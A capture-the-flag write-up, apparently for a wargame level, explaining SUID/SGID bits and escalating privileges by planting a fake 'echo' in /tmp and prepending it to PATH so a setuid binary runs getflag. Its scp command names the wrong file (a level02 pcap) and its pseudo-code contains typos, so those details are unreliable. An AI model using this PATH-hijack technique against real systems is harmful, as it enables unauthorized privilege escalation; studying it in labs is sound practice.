There is no password for flag03 here. There is an executable file at the root of the repo - "level03".

The permissions on it -rwsr-sr-x indicate that the 's' replaces 'x' in the execute permissions.

The first s is the Set User ID bit (SUID).
The second s is the Set Group ID bit (SGID).
When this bit is set, the programme executes with the permissions of the file owner (flag03) rather than the user who runs it.
When SGID is set, the programme executes with the permissions of the file's group (level03).

We trasfer this file to our computer using the scp or sftp protocol

scp -P 4242 level02@192.168.56.101:/home/user/level02/level02.pcap $HOME/Documents/

Running this file in binary ninja (which disassembles the executable and reveals the file's code) shows the contents of the programme:

```
main:
    gid_t eax = getegid()
    uid_t eax_1 = geteuid()
    setresgid(eax, eax, eax)
    setresuid(eax_1, eax__1, eax_1)
    return system("/usr/bin/env echo Exploit me)
```
getegid() gets the group ID and geteuid() gets the user ID.
setresgid and setresuid set the groupID and userID respectively, ensuring the right user and group are set when running this script.

Which explains why executing it prints Exploit me to the console.

However, since it doesn't use echo with the full path, we can create our own "echo" programme in /tmp, which runs getflag instead.

vim /tmp/echo
	/bin/getflag

chmod +x /tmp/echo
PATH=/tmp:$PATH ./level03

getflag checks whether the user ID and group ID are right, 
which is why it only generates a token when it is executed with the level03 script.
